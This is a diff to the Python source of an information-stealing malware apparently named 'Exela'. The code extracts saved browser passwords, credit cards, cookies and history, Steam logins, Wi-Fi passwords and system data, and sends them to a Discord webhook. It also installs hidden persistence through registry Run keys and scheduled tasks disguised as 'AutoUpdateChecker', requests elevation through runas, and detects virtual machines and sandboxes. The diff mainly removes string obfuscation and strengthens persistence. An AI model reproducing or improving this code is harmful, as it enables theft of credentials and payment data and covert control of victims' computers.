@@ -1,12 +1,12 @@
-import sqlite3, ctypes, sys, winreg
-import os, wmi, win32api, platform, psutil, time, GPUtil
-import shutil, pythoncom
+import sqlite3, ctypes, sys
+import os, wmi, platform, psutil, time
+import shutil
 import base64, json, threading, requests, dhooks, re, subprocess
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from pynput import keyboard
 
-UrLxD = '%REPLACE_ME_FOR_QUICADXD%'
+UrLxD = '%WEBHOOK_URL%'
 Anti_Vm = bool('%AnTiVm%')
 startup_xd = "'%StartupMethod%'"
 injectKeylogger = bool('%Keylogger%')
@@ -114,13 +114,15 @@ class QuicaxdExela:
         self.redditt = []
         self.steamm = []
         self.robloxx = []
-        self.growtopiaa = []        
-        self.doitEveryProfile()
-        self.callMozilla()
-        self.setSteam()
-        self.setDiscord()
-        self.writeAllData()
-        self.sendxd()
+        self.growtopiaa = []     
+        if not startup_xd == "no-startup":
+            self.copyToStartup()   
+        #self.doitEveryProfile()
+        #self.callMozilla()
+        #self.setSteam()
+        #self.setDiscord()
+        #self.writeAllData()
+        #self.sendxd()
     def callMozilla(self):
         self.GetMozillaProfiles()
         self.get_cookies_firefox()
@@ -166,7 +168,7 @@ class QuicaxdExela:
                 shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 conn = sqlite3.connect(self.backup_login_data_path)
                 cursor = conn.cursor()
-                query = self.reverseToNormal('snigol MORF eulav_drowssap ,eulav_emanresu ,lru_nigiro TCELES')
+                query = "SELECT origin_url, username_value, password_value FROM logins"
                 cursor.execute(query)
                 logins = cursor.fetchall()
                 conn.close()
@@ -202,7 +204,7 @@ class QuicaxdExela:
                 shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 conn = sqlite3.connect(self.backup_login_data_path)
                 cursor = conn.cursor()
-                query = self.reverseToNormal('sdrac_tiderc morf drac_no_eman ,htnom_noitaripxe ,raey_noitaripxe ,detpyrcne_rebmun_drac tceles')
+                query = "select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards"
                 cursor.execute(query)
                 logins = cursor.fetchall()
                 conn.close()
@@ -247,7 +249,7 @@ class QuicaxdExela:
                         pass
                 conn = sqlite3.connect(self.backup_login_data_path)
                 cursor = conn.cursor()
-                query = self.reverseToNormal('seikooc morf ctu_seripxe,eulav_detpyrcne ,htap ,eman ,yek_tsoh tceles')
+                query = "select host_key, name, path, encrypted_value,expires_utc from cookies"
                 cursor.execute(query)
                 logins = cursor.fetchall()
                 conn.close()
@@ -287,7 +289,7 @@ class QuicaxdExela:
                 shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 conn = sqlite3.connect(self.backup_login_data_path)
                 cursor = conn.cursor()
-                query = self.reverseToNormal('sdaolnwod morf htap_tegrat ,lru_bat tceles')
+                query = "select tab_url, target_path from downloads"
                 cursor.execute(query)
                 logins = cursor.fetchall()
                 conn.close()
@@ -315,7 +317,7 @@ class QuicaxdExela:
                 shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 conn = sqlite3.connect(self.backup_login_data_path)
                 cursor = conn.cursor()
-                query = self.reverseToNormal('slru morf emit_tisiv_tsal ,tnuoc_tisiv ,eltit ,lru ,di tceles')
+                query = "select id, url, title, visit_count, last_visit_time from urls"
                 cursor.execute(query)
                 logins = cursor.fetchall()
                 conn.close()
@@ -541,7 +543,7 @@ class QuicaxdExela:
             pass
     def setSteam(self):
         try:
-            steamLocalUserDataPath = self.reverseToNormal('fdv.sresunigol\gifnoc\maetS\)68x( seliF margorP\:C')
+            steamLocalUserDataPath = "C:\Program Files (x86)\Steam\config\loginusers.vdf"
             if os.path.isfile(steamLocalUserDataPath):
                 filee = open(steamLocalUserDataPath, "r", encoding="utf-8", errors="ignore")
                 data = filee.read()
@@ -714,6 +716,9 @@ class QuicaxdExela:
             try:
                 os.mkdir(pathxd)
                 shutil.copyfile(fullPath, pathxd + r"\Exela.exe")
+                path = pathxd + "\\Exela.exe"
+                subprocess.run(f'attrib +h +s "{pathxd}"', shell=True) # Give system priv and hidden the directory
+                subprocess.run(f'attrib +h +s "{path}"', shell=True) # Give system priv and hidden the file
             except Exception as e:
                 print(str(e))
     def getPriv(self):
@@ -727,17 +732,30 @@ class QuicaxdExela:
         output = self.getPriv()
         if startup_xd == "regedit":
             if output == 0: # copy to hkcu
-                softWare = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
-                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\ExelaUpdateService\Exela.exe")
+                code = f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "AutoUpdateChecker" /t REG_SZ /d "{os.path.join(self.local_app_data, "ExelaUpdateService", "Exela.exe")}" /f'
+                subprocess.run(code, shell=True)
             else:
-                softWare = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
-                winreg.SetValueEx(softWare, "AutoUpdateChecker", 0, winreg.REG_SZ, os.getenv("localappdata") + r"\ExelaUpdateService\Exela.exe")
+                code = f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "AutoUpdateChecker" /t REG_SZ /d "{os.path.join(self.local_app_data, "ExelaUpdateService", "Exela.exe")}" /f'
+                subprocess.run(code, shell=True)
         elif startup_xd == "schtasks":
-            if output == 1:
-                schtaskCommand = "schtasks /create /f /sc onlogon /rl highest " + "/tn \"AutoUpdateChecker\"" + " /tr " + "\"" + os.getenv("localappdata") + r"\ExelaUpdateService\Exela.exe" + "\""
-                os.system(schtaskCommand)
-            else:
-                print("need admin priw, for this method")
+            result = subprocess.run(
+                'schtasks /query /TN "AutoUpdateChecker"',
+                shell=True,
+                stdout=subprocess.PIPE,  
+                stderr=subprocess.PIPE )
+            if not result.returncode == 0: # if not file already on startup
+                if output: # if the code running with admin privilage
+                    onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "AutoUpdateCheckerOnLogon" /tr "{os.path.join(os.getenv("localappdata"), "ExelaUpdateService", "Exela.exe")}"'
+                    everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "AutoUpdateCheckerHourly" /tr "{os.path.join(os.getenv("localappdata"), "ExelaUpdateService", "Exela.exe")}"'
+                    subprocess.run(onLogonCommand, shell=True)
+                    subprocess.run(everyOneHour,shell=True)
+                else: # if the code not run with admin priv, get admin priv
+                    result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
+                        os._exit(0)
+                    else: # if not give admin code
+                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /tn "AutoUpdateCheckerHourly2" /tr "{os.path.join(os.getenv("localappdata"), "ExelaUpdateService", "Exela.exe")}"'
+                        subprocess.run(everyOneHour, shell=True)
     def sendxd(self):
         global hooksxd
         instagram = ""
@@ -789,8 +807,6 @@ class QuicaxdExela:
         hooksxdd.send(embed=embed, file=filee)
         os.remove(os.getenv('temp') + f"\\{run}.zip")
         shutil.rmtree(os.getenv('temp') + f"\\{run}")
-    def reverseToNormal(self, entry):
-        return entry[::-1]
     def writeToText(self, path, data):
         with open(path, "a", encoding="utf-8", errors="ignore") as f:
             f.write(str(data) + "\n")
@@ -841,86 +857,8 @@ class QuicaxdExela:
         process = subprocess.run(r"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Startup Info#### & wmic startup get caption,command & echo ####Firewallinfo#### & netsh firewall show state ", capture_output= True, shell= True)
         output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
         tmp = os.getenv('temp')
-        pythoncom.CoInitialize()
-        w = wmi.WMI()
-        cpu_info = w.Win32_Processor()[0]
-        cpu_cores = psutil.cpu_count(logical=False)
-        cpu_freq = psutil.cpu_freq()
-        mem_info = psutil.virtual_memory()
-        mem_details = []
-        for slot, mem in enumerate(w.Win32_PhysicalMemory()):
-            mem_details.append({
-                "Slot": slot,
-                "Capacity": mem.Capacity,
-                "Manufacturer": mem.Manufacturer,
-                "Part Number": mem.PartNumber,
-                "Speed": mem.Speed,
-                "Type": mem.MemoryType
-            })
-        disk_info = []
-        for disk in psutil.disk_partitions():
-            try:
-                usage = psutil.disk_usage(disk.mountpoint)
-                disk_info.append({
-                    "Device": disk.device,
-                    "Mount Point": disk.mountpoint,
-                    "File System": disk.fstype,
-                    "Total Space": usage.total / (1024 ** 3),
-                    "Used Space": usage.used / (1024 ** 3),
-                    "Free Space": usage.free / (1024 ** 3),
-                    "Usage Percentage": usage.percent
-                })
-            except Exception:
-                pass
-        gpu_info = []
-        try:
-            gpus = GPUtil.getGPUs()
-            for gpu in gpus:
-                gpu_info.append({
-                    "GPU Name": gpu.name,
-                    "GPU Memory": gpu.memoryTotal,
-                    "GPU Usage": gpu.memoryUtil * 100
-                })
-        except:
-            pass
         with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as f:
-            f.write("Full Hardware information\n")
-            f.write("CPU Info:\n")
-            f.write(f"   Processor: {cpu_info.Name}\n")
-            f.write(f"   Manufacturer: {cpu_info.Manufacturer}\n")
-            f.write(f"   Cores: {cpu_cores}\n")
-            f.write(f"   Max Frequency: {cpu_freq.max:.2f} MHz\n")
-            f.write(f"   Min Frequency: {cpu_freq.min:.2f} MHz\n\n")
-            
-            f.write("GPU Info:\n")
-            for gpu in gpu_info:
-                f.write(f"   GPU Name: {gpu['GPU Name']}\n")
-                f.write(f"   GPU Memory: {gpu['GPU Memory']:.2f} MB\n")
-                f.write(f"   GPU Usage: {gpu['GPU Usage']:.2f}%\n\n")
-            
-            f.write("Memory Info:\n")
-            f.write(f"   Total RAM: {mem_info.total / (1024 ** 3):.2f} GB\n")
-            f.write(f"   Available RAM: {mem_info.available / (1024 ** 3):.2f} GB\n\n")
-            
-            f.write("Detailed Memory Info:\n")
-            for mem in mem_details:
-                f.write(f"   Slot: {mem['Slot']}\n")
-                f.write(f"   Capacity: {mem['Capacity']}\n")
-                f.write(f"   Manufacturer: {mem['Manufacturer']}\n")
-                f.write(f"   Part Number: {mem['Part Number']}\n")
-                f.write(f"   Speed: {mem['Speed']}\n")
-                f.write(f"   Type: {mem['Type']}\n\n")
-            
-            f.write("Disk Info:\n")
-            for disk in disk_info:
-                f.write(f"   Device: {disk['Device']}\n")
-                f.write(f"   Mount Point: {disk['Mount Point']}\n")
-                f.write(f"   File System: {disk['File System']}\n")
-                f.write(f"   Total Space: {disk['Total Space']:.2f} GB\n")
-                f.write(f"   Used Space: {disk['Used Space']:.2f} GB\n")
-                f.write(f"   Free Space: {disk['Free Space']:.2f} GB\n")
-                f.write(f"   Usage Percentage: {disk['Usage Percentage']}%\n\n")
-                f.write(f"Full System Information\n{output}")
+            f.write(f"Full System Information\n{output}")
     def GetWifiPasswords(self, path:str):
         pathxd = os.path.join(path, "Wifi.txt")
         try:
@@ -1301,16 +1239,14 @@ class HardAntiVM:
             thread.join()
     def is_running_on_vm(self):
         detection_methods = [
-        self.normalVM,
-        self.vmcik,
-        self.check_hostname,
-        self.check_processes,
-        self.check_files,
-        self.check_gdb,
-        self.check_cursor_position,
-        self.check_hypervisor,
-        self.sandboxie,
-    ]
+            self.normalVM,
+            self.vmcik,
+            self.check_hostname,
+            self.check_processes,
+            self.check_files,
+            self.check_gdb,
+            self.check_hypervisor,
+            self.sandboxie,]
         for method in detection_methods:
             if method():
                 print(method)
@@ -1366,15 +1302,6 @@ class HardAntiVM:
         except:
             pass
         return False
-    def check_cursor_position(self):
-        try:
-            x, y = win32api.GetCursorPos()
-            if x == 0 and y == 0:
-                return True
-            
-            return False
-        except:
-            return False
     def check_hypervisor(self):
         try:
             output = subprocess.check_output(["systeminfo"], stderr=subprocess.STDOUT, shell=True)
